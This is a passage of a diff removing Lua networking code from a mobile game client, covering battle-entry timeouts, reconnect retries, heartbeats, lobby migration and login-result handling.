-      NetUtil.checkBattleLoginRetryTime = NetUtil.checkBattleLoginRetryTime + 1
-    end
-  end
-  if NetUtil.checkEnterBattle and TimeUtil.OSTime() - NetUtil.waitingEnterBattleStartTime > NetUtil.LoadingTimeOut then
-    local SmartBearerManagerLuaBridge = import("SmartBearerManagerLuaBridge")
-    local bEnterBattleTimeOutExEnabled = false
-    if SmartBearerManagerLuaBridge ~= nil then
-      bEnterBattleTimeOutExEnabled = SmartBearerManagerLuaBridge.IsClientBackEndSwitcherBEnable(1)
-    end
-    if bEnterBattleTimeOutExEnabled then
-      log(bWriteLog and "EnterBattleTimeOutEx Enabled.")
-      local EnterBattleCurStage = ""
-      local UIUtil = require("client.common.ui_util")
-      if UIUtil ~= nil and UIUtil.GetGameFrontendHUD() ~= nil then
-        EnterBattleCurStage = UIUtil.GetGameFrontendHUD():GetClientEnterBattleStage()
-      end
-      if (EnterBattleCurStage == "NMT_Welcome_Received" or EnterBattleCurStage == "LoadMapCompleted" or EnterBattleCurStage == "NetworkEstablished") and NetUtil.EnterBattleTimeOutGameID ~= g_game_id then
-        NetUtil.EnterBattleTimeOutGameID = g_game_id
-        NetUtil.LoadingTimeOut = NetUtil.LoadingTimeOut + 20
-        log(bWriteLog and "EnterBattleTimeOutEx Processed.")
-        return
-      end
-    end
-    NetUtil.StopCheckEnterBattle()
-    log(bWriteLog and "ClientEntry -----  checkEnterBattle timeout!! curStatus:" .. GameStatus.GetGameStatus() .. ", isWaittingEnterBattle:" .. tostring(LobbySystem.isWaittingEnterBattle))
-    logic_connection_waiting:Hide(1)
-    if LobbySystem.isWaittingEnterBattle then
-      LobbySystem.SetWaitingBattleFlag(false)
-      log(bWriteLog and "NetUtil.CheckTime - deanytjin test should add show mail 1")
-      if GameStatus.IsInLobbyOrMainCity() then
-        log(bWriteLog and "ClientEntry -----  checkEnterBattle timeout!! not ReturnToLobby")
-        local LoadingSystem = require("client.slua.logic.loading.logic_loading")
-        LoadingSystem.RefreshLoadPercent(1)
-        if LobbySystem.is_DeathMatchMode then
-          local TeamCompLoading = require("client.slua.logic.loading.logic_teamcomp_loading")
-          TeamCompLoading.RefreshLoadPercent(1)
-        end
-        EventSystem:postEvent(EVENTTYPE_NETWORK, EVENTID_MAIN_CITY_ENTER_BATTLE_TIMEOUT)
-      else
-        local Lobby_Main_City_Enter = require("client.slua.logic.lobby.MainCity.Lobby_Main_City_Enter")
-        Lobby_Main_City_Enter.bEnterGameFromMainCity = false
-        Client.ReturnToLobby(GameFrontendHUD)
-      end
-      if not NetManager.bConnected and LobbySystem.CheckOpen(BP_ENUM_IS_QUERY_PLAYER_STETE_AFTER_LOADING) then
-        login_module:reqLoginLobby(true, Enum_LOGIN_REPORT_CFG.LOAD_TIMEOUT)
-      else
-        local MatchSystem = require("client.slua.logic.match.logic_match")
-        MatchSystem.SetQueryPlayerFlag(true)
-      end
-      UnrealNet.HandleNetworkExceptionReport("EnterBattleTimeout", "", "")
-      local LogicGRomelink = require("client.slua.logic.gromelink.logic_grome_link")
-      LogicGRomelink:OnEnterBattleResult(LogicGRomelink.ENUM_ENTER_GAME_RET.TIMEOUT)
-      log_shipping_client("LogBattleNetFlow,  EnterBattleTimeout.")
-    end
-  end
-  if NetUtil.checkWaitingReEnterGameNotify and 5 < TimeUtil.OSTime() - NetUtil.waitingReEnterGameStartTime then
-    NetUtil.StopCheckDSActive()
-    log(bWriteLog and "ClientEntry -----  checkWaitingReEnterGameNotify timeout!! curStatus:" .. GameStatus.GetGameStatus() .. ", isWaittingEnterBattle:" .. tostring(LobbySystem.isWaittingEnterBattle))
-    logic_connection_waiting:Hide(1)
-    local bReplayState = Client.IsInReplayState(GameFrontendHUD)
-    if LobbySystem.isWaittingEnterBattle then
-      LobbySystem.SetWaitingBattleFlag(false)
-      log(bWriteLog and "NetUtil.CheckTime - deanytjin test should add show mail 2")
-      if GameStatus.IsInLobbyOrMainCity() then
-        log(bWriteLog and "ClientEntry -----  checkWaitingReEnterGameNotify timeout!! not ReturnToLobby true")
-        local LoadingSystem = require("client.slua.logic.loading.logic_loading")
-        LoadingSystem.RefreshLoadPercent(1)
-        if LobbySystem.is_DeathMatchMode then
-          local TeamCompLoading = require("client.slua.logic.loading.logic_teamcomp_loading")
-          TeamCompLoading.RefreshLoadPercent(1)
-        end
-        return
-      end
-      Client.ReturnToLobby(GameFrontendHUD)
-    elseif GameStatus.IsInFightingStatus() and not BattleResult.IgnoreDSError and not bReplayState then
-      if GameStatus.IsInLobbyOrMainCity() then
-        log(bWriteLog and "ClientEntry -----  checkWaitingReEnterGameNotify timeout!! not ReturnToLobby false")
-        local LoadingSystem = require("client.slua.logic.loading.logic_loading")
-        LoadingSystem.RefreshLoadPercent(1)
-        if LobbySystem.is_DeathMatchMode then
-          local TeamCompLoading = require("client.slua.logic.loading.logic_teamcomp_loading")
-          TeamCompLoading.RefreshLoadPercent(1)
-        end
-        return
-      end
-      local strTile = LocUtil.GetLocalizeResStr(102012)
-      local strMsg = ""
-      local home_macros = require("client.slua.logic.home.home_macros")
-      local Logic_PlanCHMacros = require("client.slua.logic.CollectionHall.Logic_PlanCHMacros")
-      local sub_mode = tonumber(Client.GetGameModeID(GameFrontendHUD))
-      if sub_mode == home_macros.Home_SubMode.Visit then
-        strMsg = LocUtil.GetLocalizeResStr(655421)
-      elseif sub_mode == Logic_PlanCHMacros.CollectionHall_SubMode.Visit then
-        strMsg = LocUtil.GetLocalizeResStr(880060019)
-      else
-        strMsg = LocUtil.GetLocalizeResStr(77010)
-      end
-      local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-      CommonMsgBoxMgr.Show(1, strTile, strMsg, function()
-        if GameStatus.IsInFightingStatus() then
-          FuncUtil.ShowLoadingToLobby()
-          Client.ReturnToLobby(GameFrontendHUD)
-          Client.TPerforPlatDisconnectReport(GameFrontendHUD, 11)
-        end
-      end, nil, nil, nil, {isConnectionPanel = true})
-    end
-  end
-  if NetUtil.checkConnectingInFighting then
-    local interval = 0
-    if NetUtil.checkConnectingInFightingTimes == 0 or NetUtil.checkConnectingInFightingTimes == 1 then
-      interval = 5
-    elseif NetUtil.checkConnectingInFightingTimes == 2 then
-      interval = 10
-    elseif NetUtil.checkConnectingInFightingTimes == 3 then
-      interval = 15
-    else
-      interval = NetUtil.checkConnectingInFightingRandomInterval
-    end
-    if interval < TimeUtil.OSTime() - NetUtil.waitingReEnterGameStartTime then
-      log(bWriteLog and "ClientEntry ----- tryConnect lobby in fighting!!! curTime:" .. TimeUtil.OSTime() .. ", startTime:" .. NetUtil.waitingReEnterGameStartTime .. ", interval:" .. interval)
-      if not Client.IsConnected(NetInterface) and GameStatus.IsInFightingStatus() then
-        local MatchModeMgrSystem = require("client.slua.logic.match.logic_mode_mgr")
-        if MatchModeMgrSystem and MatchModeMgrSystem.IsSocialIslandMode(true) and NetUtil.checkConnectingInFightingTimes > 3 then
-          local strTile = LocUtil.GetLocalizeResStr(102012)
-          local strMsg = LocUtil.GetLocalizeResStr(301113)
-          local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-          CommonMsgBoxMgr.Show(1, strTile, strMsg, function()
-            FuncUtil.ShowLoadingToLobby()
-            Client.ReturnToLobby(GameFrontendHUD)
-            if not NetManager.bConnected and LobbySystem.CheckOpen(BP_ENUM_IS_QUERY_PLAYER_STETE_AFTER_LOADING) then
-              login_module:reqLoginLobby(true, Enum_LOGIN_REPORT_CFG.SOCIAL_ISLAND)
-            else
-              local MatchSystem = require("client.slua.logic.match.logic_match")
-              MatchSystem.SetQueryPlayerFlag(true)
-            end
-            logic_connection_waiting:Hide(1)
-          end, nil, nil, nil, {isConnectionPanel = true})
-        else
-          NetUtil.checkConnectingInFightingTimes = NetUtil.checkConnectingInFightingTimes + 1
-          NetUtil.tryConnect(Enum_LOGIN_REPORT_CFG.NET_CONNECT_FRIGHT)
-          NetUtil.checkConnectingInFightingRandomInterval = math.random(30, 40)
-        end
-      else
-        log(bWriteLog and "ClientEntry -----  stop checkConnectingInFighting")
-        NetUtil.checkConnectingInFighting = false
-        NetUtil.waitingReEnterGameStartTime = 0
-        NetUtil.checkConnectingInFightingTimes = 0
-      end
-      NetUtil.waitingReEnterGameStartTime = TimeUtil.OSTime()
-    end
-  end
-  UpdateResultMonitor()
-end
-
-function NetUtil.StopCheckLoginOtherLobbyServer()
-  log(bWriteLog and "ClientEntry -----  StopCheckLoginOtherLobbyServer")
-  if NetUtil.checkLoginOtherLobbyServer then
-    logic_connection_waiting:Hide(1)
-  end
-  log_warning(bWriteLog and "NetUtil.StopCheckLoginOtherLobbyServer checkLoginOtherLobbyServer false")
-  NetUtil.checkLoginOtherLobbyServer = false
-end
-
-function NetUtil.OnEnterBattleStageDelegate(InStage)
-  local loading_macro = require("client.slua.logic.loading.loading_macro")
-  local CurStagePercent = loading_macro.EnterBattleStagePercentMap[InStage]
-  if CurStagePercent ~= nil then
-    log(bWriteLog and "NetUtil.OnEnterBattleStageDelegate Stage: " .. InStage .. ", percent: " .. tostring(CurStagePercent))
-    local LoadingSystem = require("client.slua.logic.loading.logic_loading")
-    LoadingSystem.RefreshLoadPercent(CurStagePercent, true)
-    if LobbySystem.is_DeathMatchMode == true then
-      log(bWriteLog and "NetUtil.OnEnterBattleStageDelegate RefreshLoadPercent:exported" .. tostring(CurStagePercent))
-      local TeamCompLoading = require("client.slua.logic.loading.logic_teamcomp_loading")
-      TeamCompLoading.RefreshLoadPercent(CurStagePercent, true)
-    end
-  else
-    log(bWriteLog and "NetUtil.OnEnterBattleStageDelegate Stage is nil, " .. InStage)
-  end
-end
-
-function NetUtil.OnEnterBattleStageDelegate_MainCity(InStage)
-  log(bWriteLog and "NetUtil.OnEnterBattleStageDelegate_MainCity Stage: " .. tostring(InStage))
-  local loading_macro = require("client.slua.logic.loading.loading_macro")
-  local CurStagePercent = loading_macro.EnterBattleStagePercentMap[InStage]
-  log(bWriteLog and "NetUtil.OnEnterBattleStageDelegate_MainCity CurStagePercent: " .. tostring(CurStagePercent))
-end
-
-function NetUtil.BindEnterBattleStageDelegate(sub_mode)
-  log(bWriteLog and "NetUtil.BindEnterBattleStageDelegate sub_mode: " .. tostring(sub_mode))
-  NetUtil.RemoveEnterBattleStageDelegate()
-  if NetUtil.EnterBattleStageDelegate == nil then
-    local UIUtil = require("client.common.ui_util")
-    local GameFrontHUD = UIUtil.GetGameFrontendHUD()
-    if GameFrontHUD ~= nil then
-      local Lobby_Main_City = require("client.slua.logic.lobby.MainCity.Lobby_Main_City")
-      if Lobby_Main_City.IsMainCitySubMode(sub_mode) then
-        NetUtil.EnterBattleStageDelegate = GameFrontHUD.EnterBattleStageDelegate:Add(function(InStage)
-          NetUtil.OnEnterBattleStageDelegate_MainCity(InStage)
-        end)
-      else
-        NetUtil.EnterBattleStageDelegate = GameFrontHUD.EnterBattleStageDelegate:Add(function(InStage)
-          NetUtil.OnEnterBattleStageDelegate(InStage)
-        end)
-      end
-      log(bWriteLog and "ClientEntry ----- NetUtil.BindEnterBattleStageDelegate")
-    end
-  end
-end
-
-function NetUtil.RemoveEnterBattleStageDelegate()
-  log(bWriteLog and "NetUtil.RemoveEnterBattleStageDelegate")
-  if NetUtil.EnterBattleStageDelegate ~= nil then
-    local UIUtil = require("client.common.ui_util")
-    local GameFrontHUD = UIUtil.GetGameFrontendHUD()
-    if GameFrontHUD ~= nil then
-      GameFrontHUD.EnterBattleStageDelegate:Remove(NetUtil.EnterBattleStageDelegate)
-    end
-    NetUtil.EnterBattleStageDelegate = nil
-    log(bWriteLog and "ClientEntry ----- NetUtil.RemoveEnterBattleStageDelegate")
-  end
-end
-
-function NetUtil.StartCheckLoginRsp()
-  log(bWriteLog and "ClientEntry ----- NetUtil.StartCheckLoginRsp......")
-  NetUtil.checkLoginRsp = true
-  NetUtil.sendLoginTime = TimeUtil.OSTime()
-end
-
-function NetUtil.StopCheckLoginRsp()
-  log(bWriteLog and "ClientEntry ----- NetUtil.StopCheckLoginRsp!!!!!")
-  NetUtil.checkLoginRsp = false
-  NetUtil.sendLoginTime = 0
-  NetUtil.checkLoginRetryTime = 0
-  if 0 < NetUtil.checkBattleLoginRetryTime then
-    local realRetryTime = 1
-    if NetUtil.checkBattleLoginRetryTime > 2 then
-      realRetryTime = 2
-    elseif NetUtil.checkBattleLoginRetryTime > 5 then
-      realRetryTime = 3
-    end
-    local param = {realRetryTime}
-    NetUtil.GEMReportSubEvent("ReonnectAfterLoginFail", param)
-  end
-  NetUtil.checkBattleLoginRetryTime = 0
-  NetUtil.bIsTimeOutReconnect = 0
-end
-
-function NetUtil.StartCheckDSActive()
-  log(bWriteLog and "NetUtil.StartCheckDSActive")
-  local curStatus = LuaClassObj.GetGameStatus(bp_global)
-  log(bWriteLog and "ClientEntry -----  StartCheckDSActive isWaittingEnterBattle: " .. tostring(LobbySystem.isWaittingEnterBattle) .. ", curStatus: " .. curStatus)
-  if LobbySystem.isWaittingEnterBattle and NetUtil.EnterBattleTime > 0 and 0 < NetUtil.waitingEnterBattleStartTime and NetUtil.EnterBattleTime >= NetUtil.waitingEnterBattleStartTime then
-    log(bWriteLog and "NetUtil.EnterBattleTime >= NetUtil.waitingEnterBattleStartTime, Skip StartCheckDSActive.")
-    return
-  end
-  local dsNetState = Client.GetUnrealNetworkStatus(GameFrontendHUD)
-  if (LobbySystem.isWaittingEnterBattle or curStatus == GameStatus.Fighting) and dsNetState ~= "Online" and NetUtil.checkWaitingReEnterGameNotify == false then
-    NetUtil.checkWaitingReEnterGameNotify = true
-    NetUtil.waitingReEnterGameStartTime = TimeUtil.OSTime()
-    log(bWriteLog and "ClientEntry -----  waitingReEnterGameStartTime:" .. NetUtil.waitingReEnterGameStartTime)
-  end
-end
-
-function NetUtil.StopCheckDSActive()
-  log(bWriteLog and "ClientEntry -----  StopCheckDSActive")
-  NetUtil.checkWaitingReEnterGameNotify = false
-  NetUtil.waitingReEnterGameStartTime = 0
-end
-
-function NetUtil.StartCheckEnterBattle(sub_mode)
-  if LobbySystem.isWaittingEnterBattle then
-    NetUtil.checkEnterBattle = true
-    NetUtil.waitingEnterBattleStartTime = TimeUtil.OSTime()
-    local SubModeCfg = CDataTable.GetTableData("BTMode", sub_mode)
-    if SubModeCfg and SubModeCfg.LoadingTimeOut and SubModeCfg.LoadingTimeOut > 70 then
-      NetUtil.LoadingTimeOut = SubModeCfg.LoadingTimeOut
-    else
-      NetUtil.LoadingTimeOut = 70
-    end
-    if Client.IsAsanVersion() then
-      NetUtil.LoadingTimeOut = 1000
-    end
-    log(bWriteLog and "ClientEntry -----  waitingEnterBattleStartTime:" .. NetUtil.waitingEnterBattleStartTime)
-    log(bWriteLog and "ClientEntry -----  LoadingTimeOut:" .. NetUtil.LoadingTimeOut)
-    NetUtil.BindEnterBattleStageDelegate(sub_mode)
-    if LobbySystem.is_DeathMatchMode == true then
-      local TeamCompLoading = require("client.slua.logic.loading.logic_teamcomp_loading")
-      TeamCompLoading.SetInitPercent(50)
-    else
-      local LoadingSystem = require("client.slua.logic.loading.logic_loading")
-      LoadingSystem.SetInitPercent(50)
-    end
-  end
-end
-
-function NetUtil.StopCheckEnterBattle()
-  log(bWriteLog and "ClientEntry -----  StopCheckEnterBattle EnterBattleLoadingTime:", NetUtil.EnterBattleLoadingTime)
-  NetUtil.checkEnterBattle = false
-  NetUtil.waitingEnterBattleStartTime = 0
-  NetUtil.LoadingTimeOut = 70
-  NetUtil.RemoveEnterBattleStageDelegate()
-end
-
-function NetUtil.OnTick(curTime)
-  local ban_login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.ban_login_module)
-  if ban_login_module.hasKickOut then
-    return
-  end
-  if NetUtil.gameTick then
-    if curTime - NetUtil.SendTime >= 5 then
-      NetUtil.SendTime = curTime
-      NetUtil.LobbyDelaySendTime = TimeUtil.GetMiliseconds()
-      NetHeartBeatHandler.send_heart_beat(curTime)
-    end
-    if curTime - NetUtil.SendOneTime >= 1 then
-      NetUtil.SendOneTime = curTime
-      if LobbySystem.isInLobby then
-        NetUtil.SendTss()
-      end
-    end
-  end
-end
-
-function NetUtil.OnChangeLobbyServerNotify(relogin_seconds, reason)
-  log(bWriteLog and "ClientEntry ----- OnChangeLobbyServerNotify relogin_seconds:" .. tostring(relogin_seconds) .. " reason:" .. tostring(reason))
-  local _migrate = function()
-    log_warning(bWriteLog and "NetUtil.OnChangeLobbyServerNotify checkLoginOtherLobbyServer true")
-    NetUtil.checkLoginOtherLobbyServer = true
-    NetUtil.Disconnect()
-    local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
-    login_module:HandlemServerMigrationAndConnect()
-  end
-  local handleFunc = NetUtil.Please_Relogin_Req
-  if reason and type(reason) == "string" and reason == "data-migration" then
-    handleFunc = _migrate
-  end
-  if 0 < relogin_seconds then
-    local time_ticker = require("common.time_ticker")
-    if NetUtil.PleaseReloginTimer then
-      time_ticker.RemoveTimer(NetUtil.PleaseReloginTimer)
-      NetUtil.PleaseReloginTimer = nil
-    end
-    NetUtil.PleaseReloginTimer = time_ticker.AddTimerOnce(relogin_seconds, handleFunc)
-  else
-    handleFunc()
-  end
-end
-
-function NetUtil.Please_Relogin_Req()
-  log(bWriteLog and "ClientEntry ----- Please_Relogin_Req ~~~~~~~")
-  log_warning(bWriteLog and "NetUtil.Please_Relogin_Req checkLoginOtherLobbyServer true")
-  NetUtil.checkLoginOtherLobbyServer = true
-  NetUtil.Disconnect()
-  NetUtil.tryConnect(Enum_LOGIN_REPORT_CFG.NET_RELOGIN)
-end
-
-function NetUtil.OnHeartBeatRsp(now)
-  TimeUtil.SetServerTimeInSec(now)
-  NetUtil.LobbyDelayRecvTime = TimeUtil.GetMiliseconds()
-end
-
-function NetUtil.GetZoneValue()
-  local ms = 10000
-  local ZoneSystem = require("client.slua.logic.teamup.logic_zone")
-  local zoneList = ZoneSystem.chooseZoneList
-  local zoneID = ZoneSystem.nChooseZoneID
-  if not (zoneID and zoneList) or #zoneList <= 0 then
-    return ms
-  end
-  local ip = ""
-  for _, v in ipairs(zoneList) do
-    if zoneID == v.zone_id then
-      ip = v.tpingsvr_ip
-      break
-    end
-  end
-  if ip ~= "" then
-    local UDPPingCollector = slua_GameFrontendHUD.UDPPingCollector
-    ms = UDPPingCollector:GetZoneServerDelay(ip)
-  end
-  if 10000 < ms then
-    ms = 80
-  end
-  return ms
-end
-
-function NetUtil.IsGrowthGuideSubMode(sub_mode)
-  local enter_guide = require("client.slua.logic.growth_project.enter_guide")
-  local mode_id = enter_guide.MatchId
-  if sub_mode == mode_id then
-    return true
-  else
-    return false
-  end
-end
-
-function NetUtil.ShowConnectionMsgBox(showPanelTimes, errorMsg)
-  log(bWriteLog and "ClientEntry -----  NetUtil.ShowConnectionMsgBox: " .. showPanelTimes .. ", curStatus:" .. GameStatus.GetGameStatus() .. ", errorMsg = " .. tostring(errorMsg))
-  NetUtil.gameTick = false
-  local clickOkCallback = function()
-    NetUtil.tryConnect(Enum_LOGIN_REPORT_CFG.NET_CONNECT_MSGBOX)
-  end
-  local clickCancelCallback = function()
-    local login = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
-    login:backLogin()
-    local LogicFitVersionDownload = require("client.slua.logic.download.fit.logic_fitVersion_download")
-    LogicFitVersionDownload.TryReshowDeleteRestartHint("ShowConnectionMsgBoxCancel", true)
-  end
-  logic_connection_waiting:Hide(1)
-  local strTile = LocUtil.GetLocalizeResStr(102012)
-  local strMsg = LocUtil.GetLocalizeResStr(103015)
-  if showPanelTimes == 2 then
-    strMsg = LocUtil.GetLocalizeResStr(301226)
-  elseif showPanelTimes == 3 then
-    strMsg = LocUtil.GetLocalizeResStr(301227)
-  else
-    strMsg = LocUtil.GetLocalizeResStr(301228)
-  end
-  local extraData = {isConnectionPanel = true, androidCallback = clickCancelCallback}
-  if showPanelTimes < 4 then
-    local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-    CommonMsgBoxMgr.HideAllPanel()
-    CommonMsgBoxMgr.Show(2, strTile, strMsg, clickOkCallback, clickCancelCallback, LocUtil.GetLocalizeResStr(62649), nil, extraData)
-  else
-    local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-    CommonMsgBoxMgr.HideAllPanel()
-    CommonMsgBoxMgr.Show(1, strTile, strMsg, clickCancelCallback, nil, LocUtil.GetLocalizeResStr(62649), nil, extraData)
-  end
-end
-
-function NetUtil.tryConnect(reason)
-  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
-  local lobbyInfo = login_module.loginLobbyInfo
-  log_shipping_client("[Login process] ClientEntry -----  NetUtil.tryConnect curStatus:" .. GameStatus.GetGameStatus() .. " for reason = " .. tostring(reason))
-  NetUtil.gameTick = false
-  NetUtil.SendTime = TimeUtil.OSTime()
-  local isConnected = Client.IsConnected(NetInterface)
-  log(bWriteLog and "ClientEntry NetUtil.tryConnect Client.IsConnected is " .. tostring(isConnected))
-  if not GameStatus.IsInFightingStatus() then
-    logic_connection_waiting:Show(1)
-  end
-  NetUtil.ConnectReason = reason
-  if NetUtil.ConnectReason == Enum_LOGIN_REPORT_CFG.NET_MSG_TIME_OUT then
-    NetUtil.bIsTimeOutReconnect = 1
-  end
-  NetUtil.ConnectToURL(lobbyInfo.Url)
-end
-
-local normalEvent = {
-  [9999] = 1,
-  [211] = 1
-}
-local eventParam2ToErrorCode = {
-  [2002] = 18010163,
-  [2500] = 18010164,
-  [2515] = 18010161,
-  [2516] = 18010170,
-  [2517] = 18010170,
-  [2518] = 18010169
-}
-
-function NetUtil.OnNetworkEvent(eventID, eventParam, eventParam2)
-  local normalRes = eventParam2ToErrorCode[eventParam2]
-  local IMSDKSystem = require("client.logic.login.logic_imsdk")
-  local ShareMgr = require("client.logic.share.share_logic")
-  log(bWriteLog and "ClientEntry -----  OnNetworkEvent: eventID = " .. eventID .. " eventParam = " .. eventParam)
-  local login_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
-  local curStatus = GameStatus.GetGameStatus()
-  logic_connection_waiting:Hide(1)
-  if eventID == 1 then
-    log(bWriteLog and "authorization initialized")
-  elseif eventID == 2 then
-    log(bWriteLog and "NetUtil.OnNetworkEvent, login result = " .. tostring(eventParam))
-    if PublishRegionMacros.IsGlobalOperationRegion() then
-      local logic_login_event = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.logic_login_event)
-      logic_login_event:HandleLoginResult(eventParam, eventParam2)
-      return
-    end
-    local SDKMacros = require("client.slua.config.ClientMacros.SDKMacros")
-    local IMSDKServerError = SDKMacros.IMSDKServerErrorCode
-    IMSDKSystem.StopIMSDKTimer()
-    NetUtil.noRefreshLogout = false
-    local SettingAccount = require("client.logic.setting.logic_setting_account")
-    SettingAccount.SetunifiedAccountLogging(false)
-    local SVPNSystem = require("client.slua.logic.gamemaster.logic_svpn")
-    SVPNSystem.OnIMSDKLoginResult(eventParam)
-    local logic_http_dns = require("client.slua.logic.httpdns.logic_http_dns")
-    logic_http_dns:OnMSDKLogin()
-    local logic_imsdk_interface = require("client.logic.login.logic_imsdk_interface")
-    logic_imsdk_interface:OnMSDKLogin()
-    local DevicePlatformNameMacros = require("client.slua.config.ClientMacros.DevicePlatformNameMacros")
-    if eventParam ~= 0 then
-      login_module:ShowButtonsAfterLoginFailed()
-      if eventParam ~= 106 and eventParam ~= 611 and eventParam ~= 701 and eventParam ~= 2 then
-        NetUtil.LogoutNoRefresh()
-      end
-      EventSystem:postEvent(EVENTTYPE_LOGIN, EVENTID_LOGIN_FAIL_NETUTIL)
-    end
-    if eventParam == 0 then
-      log(bWriteLog and "login ok")
-      login_module:ClearLoginCountAndTime()
-      EventSystem:postEvent(EVENTTYPE_LOGIN, EVENTID_LOGIN_SUCCESS_NETUTIL)
-      local logic_cloud_game = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.logic_cloud_game)
-      logic_cloud_game:SendMessageToCloudGame(logic_cloud_game.ProtocolName.SDKLoginSuccess)
-      local UpdateEndCallBack = function()
-        log(bWriteLog and "UpdateEndCallBack")
-        local channel = Client.GetLoginChannel(NetInterface)
-        log(bWriteLog and "authorization login ok, channel = " .. channel)
-        if channel == BP_ENUM_PLAYFORM_UnifiedAccountByiTOP then
-          local PlayerPrefsSystem = require("client.logic.LogicPlayerPrefs.playerprefs")
-          if login_module.phoneMailType ~= 0 then
-            local tb = {
-              unified_type = login_module.phoneMailType
-            }
-            print(bWriteLog and "UpdateEndCallBack save unified_type = " .. tostring(tb.unified_type))
-            PlayerPrefsSystem.SaveTableToFile_N(tb, PlayerPrefsSystem.ePlayerPrefsType.eMailPhoneLoginType)
-          end
-        end
-        if globalConfig.IsDirectConnect() == false and globalConfig.isSupervision == false then
-          log("hideAuthorizationUI")
-          local is_uepubgm = Client.IsUEPUBGM()
-          local servername = ""
-          if Client.IsEditor() then
-            local UEPUBGMConfig = RequireBlackList("blacklist.editor.uepubgm.UEPUBGMConfig")
-            servername = UEPUBGMConfig.GetServerName()
-          else
-            servername = Client.GetUEPUBGMServerName()
-          end
-          if not is_uepubgm or servername == "" then
-            login_module:Transition(login_module.ELoginFSMEvent.Event_LTCS)
-            if channel == BP_ENUM_PLAYFORM_WX and curStatus == GameStatus.Login then
-              ShowNotice("101709", true)
-            end
-            return
-          end
-          log(bWriteLog and "[ori]Start log in with uepubgm")
-          login_module:LoginToServer(servername)
-        else
-          log("Connect to Gate Directly")
-          login_module:ConnectToGate()
-        end
-      end
-      local version_up_module = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.version_up_module)
-      log(bWriteLog and "NetUtil.OnNetworkEvent, alreadyGrayUpdate = " .. tostring(version_up_module.bAlreadyGrayUpdate))
-      if not version_up_module.bAlreadyGrayUpdate then
-        version_up_module:StartGrayUpdate(UpdateEndCallBack)
-      else
-        UpdateEndCallBack()
-      end
-      NetUtil.needInitCentauriWhenLogin = true
-    elseif eventParam == 3 then
-      log(bWriteLog and "auth fail need retry")
-      ShowNotice(101713)
-    elseif eventParam == 106 then
-      log(bWriteLog and "auth fail for user cancel")
-      ShowNotice(101711)
-    elseif eventParam == 701 then
-      if curStatus == GameStatus.Login then
-        local title = LocUtil.GetLocalizeResStr(101001)
-        local notice = LocUtil.GetLocalizeResStr(4188)
-        local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-        CommonMsgBoxMgr.Show(1, title, notice)
-      end
-    elseif eventParam == 1001 or eventParam == 1002 then
-      log(bWriteLog and "client_entry NetUtil.OnNetworkEvent QuickLogin Fail eventParam:" .. tostring(eventParam))
-    elseif (eventParam == 211 or eventParam == 9999) and eventParam2 == 2146 then
-      if curStatus == GameStatus.Login then
-        NetUtil.ShowUnifiedAccountException()
-      end
-    elseif normalEvent[eventParam] and normalRes then
-      NetUtil.ShowMsgCommonMsg(normalRes)
-    elseif (eventParam == 211 or eventParam == 9999) and eventParam2 == IMSDKServerError.CHANNEL_OPENID_BANED then
-      local IMSDKHelper = import("IMSDKHelper")
-      local loginRetJson = IMSDKHelper.GetInstance():GetLastLoginResultJson()
-      local loginRet = json.decode(loginRetJson)
-      if loginRet.thirdRetCode == IMSDKServerError.CHANNEL_OPENID_BANED then
-        local thridMsgJson = loginRet.thirdRetMsg
-        local thridMsg = json.decode(thridMsgJson)
-        local openid = thridMsg.iOpenid
-        local channel = thridMsg.iChannel
-        local msg = thridMsg.msg
-        local bandEndTime = thridMsg.iBanEnd
-        login_module:ShowFreezePopupUI(openid, channel, bandEndTime)
-      end
-    elseif 9999 <= eventParam and eventParam <= 100000 then
-      login_module:UpdateLoginCountAndTime()
-      if curStatus == GameStatus.Login then
-        local title = LocUtil.GetLocalizeResStr(101001)
-        local notice = NetUtil.GetSDKErrorNotice(eventParam, eventParam2)
-        local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
-        CommonMsgBoxMgr.Show(1, title, notice)
-      end
-    elseif eventParam == 611 then
-      log(bWriteLog and "login failed:" .. eventParam)
-      local client_imsdk_eventparam = require("client.logic.ClientEntry.client_imsdk_eventparam")
-      local channel = Client.GetLoginChannel(NetInterface)
-      log(bWriteLog and "login failed:" .. eventParam .. " channel:" .. channel)
-      if client_imsdk_eventparam.channel2ItopErrorCodeTable[channel] then
-        local data = {
-          ItopErrorCode = client_imsdk_eventparam.channel2ItopErrorCodeTable[channel],
-          eventParam2 = eventParam2,
-          channel = channel
-        }
-        UIManager.ShowUI(UIManager.UI_Config.Protection_UIBP, data)
-        return
-      else
-        login_module:UpdateLoginCountAndTime()
-        NetUtil.ShowSDKErrorNotice(eventParam, eventParam2)
-      end
-    else
-      log(bWriteLog and "login failed:" .. eventParam)
-      if eventParam ~= -1 and eventParam ~= 6 and eventParam ~= 7 and eventParam ~= 106 and eventParam ~= 107 and eventParam ~= 109 and eventParam ~= 200 then
-        if curStatus ~= GameStatus.Login then
-          return
-        end
-        login_module:UpdateLoginCountAndTime()
-        NetUtil.ShowSDKErrorNotice(eventParam, eventParam2)
-        return
-      end
-      login_module:UpdateLoginCountAndTime()
-      login_module:ShowLoginUI()
-      if eventParam == 7 and DevicePlatformNameMacros.IsPC() then
-        ShowNotice(101710)
-      end
-    end
-  elseif eventID == 3 then
-    log(bWriteLog and "NetUtil.OnNetworkEvent, logout result = " .. tostring(eventParam))
-    if NetUtil.noRefreshLogout ~= true then
-      local login = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
-      login:backLogin(1)
-    end
-    NetUtil.noRefreshLogout = false
-  elseif eventID == 4 then
-    IMSDKSystem.StopIMSDKTimer()
-    EventSystem:postEvent(EVENTTYPE_SHARE, EVENTID_SHARE_BACK)
